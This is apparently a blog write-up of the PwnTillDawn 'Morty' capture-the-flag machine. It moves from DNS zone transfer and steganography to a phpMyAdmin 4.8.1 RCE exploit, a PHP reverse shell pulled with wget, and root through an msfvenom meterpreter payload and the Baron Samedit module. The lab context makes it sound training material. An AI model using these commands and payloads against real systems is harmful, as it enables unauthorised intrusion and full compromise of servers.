---
layout: post
title: PwnTillDawn - Morty Write-Up
date: 2025-02-26
classes: wide
description: Using DNS queries to enumerate subdomains, acquiring credentials from images through steganography to access phpMyAdmin and exploring known CVEs to acquire shell and set foothold inside the target server.
---

# Morty (10.150.150.57)

![](/assets/img/post/pwntilldawn_morty/1.png)



## Initial Scanning

As usual, let's use Nmap to identify services in the machine:

```shell
sudo nmap -sV -sC -p- 10.150.150.57 -oN scans/nmap.txt
```

![](/assets/img/post/pwntilldawn_morty/2.png)

Some relevant information from the scanning result:

- Default port for SSH is available, maybe it can be accessed later on
- DNS service (`ISC BIND 9.16.'`) is also available, typing that it'll be either exploited or used for enumeration
- Lastly, an `Apache 2.4.41` that has a `note.html` on it's root.



## DNS Treasure Hunt

The `note.html` file is a message from Rick to Morty (If you've never watched Rick and Morty, you should) informing that a domain (`mortysserver.com`) has been configured:

```
Morty,
if you read this: I've already configured your domain 'mortysserver.com' on this server, don't bother me with it anymore!!
-Rick
```

So we'll be adding the domain to our `/etc/hosts` file.

```
10.150.150.57 mortysserver.com
```

Once we access the index page from the server, we'll be greeted with a welcome message and the following text and image:

```
WELCOME TO MORTY'S SERVER
Is it a password? Maybe.
```

And the following background image with a `Fl4sk#!` password written on it:

![](/assets/img/post/pwntilldawn_morty/3.png)

I'd recommend downloading the image from the site, this will be useful later on.

Enumerating the web server is a waste, we can't find any other directories, and enumerating for virtual hosts only shows the `www` which is the same page with no additional information. Time to take advantage of that DNS service running and see if we can identify new subdomains through different queries.

```shell
dig axfr @10.150.150.57 mortysserver.com
```

![](/assets/img/post/pwntilldawn_morty/4.png)

Although requesting any records returns an `email` subdomain, it doesn't have any additional information, instead it has the same contents as `www`, but requesting a Zone Tranfer reveals a new subdomain: `rickscontrolpanel`. Once more, the newly found subdomain must be added in `/etc/hosts` file:

```
10.150.150.57 mortysserver.com rickscontrolpanel.mortysserver.com
```



## I'm in a Stego, Morty!

Accessing Rick's Control Panel show up a phpMyAdmin login page and the first flag (`FLAG1`), which unfortunately we don't have credentials to access:

![5](/assets/img/post/pwntilldawn_morty/5.png)

After trying to guess some obvious usernames such as *Rick* and *Morty*, I've thought about something different. The image we saw earlier had been edited to add the password, so maybe it's related to it as well. Thought we can't find any information in metadata, the password can be used to extract information from the image using Steghide:

```shell
steghide extract -sf screen.jpeg
```

Extracting from the image generates a new file called `keytotheuniverse.txt` and the file does contain credentials that can be used to access phpMyAdmin:

```
rick:WubbaLubbaDubDub1!
```



## CVE-137 Morty! It’s a Classic!

Now we have access to phpMyAdmin, and the second flag (`FLAG2`):

![6](/assets/img/post/pwntilldawn_morty/6.png)

The application has no further information about what should we do, and using the same credentials for SSH didn't work. So I've decided to search for known CVEs based on PMA version that's available on source-code (`4.8.1`) and found a this [one](https://www.exploit-db.com/exploits/50457):

![7](/assets/img/post/pwntilldawn_morty/7.png)

Who doesn't love RCE exploits? This exploit does require credentials, which we have at our disposal, so let's use it:

```shell
python exploit.py rickscontrolpanel.mortysserver.com 80 / rick WubbaLubbaDubDub1! 'cat /etc/passwd'
```

![8](/assets/img/post/pwntilldawn_morty/8.png)

Great! Now just we can either explore the server using this exploit or upload a shell. I've decided to use Python to server a PHP reverse shell, download it remotely using `wget` and use netcat to receive the connection.

![9](/assets/img/post/pwntilldawn_morty/9.png)

After enumerating the server, thinking about how to escalate privileges, I've discovered that the last flag (`FLAG3`) was easily accessible in Morty's home directory:

![10](/assets/img/post/pwntilldawn_morty/10.png)

With the final flag, the CTF comes to the end!



## Bonus: Rooting the Server

Though there's no purpose in rooting this server since it has no additional flags, compromising a single user itself wasn't enough for me, so I've found out the server can actually be rooted by abusing **CVE-2021-3156** (a.k.a. Baron Samedit). The easiest way to exploit this CVE is by uploading a Metasploit reverse shell to the server and using it's post modules to run the exploit. You can use `msfvenom` to generate the payload:

```
msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=tun0 lport=4444 -f elf -o shell
```

Python's`http.server` to serve the payload:

```
sudo python -m http.server 80
```

Then, use msfconsole to setup the listener:

```
msfconsole -x "use multi/handler;set lhost=tun0;set lport=4444;run -j"
```

Once the session is established, you should use the CVE module available in `linux/local/sudo_baron_samedit`:

![11](/assets/img/post/pwntilldawn_morty/11.png)

And you're good to go:

![12](/assets/img/post/pwntilldawn_morty/12.png)

As you can see, no additional flags, but still cool anyways!